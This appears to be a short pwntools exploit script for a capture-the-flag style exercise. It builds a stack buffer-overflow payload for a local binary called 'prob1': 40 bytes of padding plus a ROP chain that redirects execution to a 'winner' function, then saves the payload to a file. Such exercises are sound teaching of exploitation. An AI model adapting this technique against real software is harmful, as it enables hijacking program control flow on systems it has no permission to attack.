from pwn import *
import struct

# Specify the arch
context.arch = "amd64"

# Load the executable
elf = ELF("./prob1")

# Get the offsets using GDB
offset = 40
winner = 0x4005b6

# Create the ROP chain
rop = ROP(elf)
rop.call(elf.symbols["winner"])

# Join the payload
payload = [
    b"A"*offset,
    rop.chain(),
    # b"B"*8
]

payload = b"".join(payload)

# Save it in a file
f = open("exploit", "wb")
f.write(payload)
f.close()
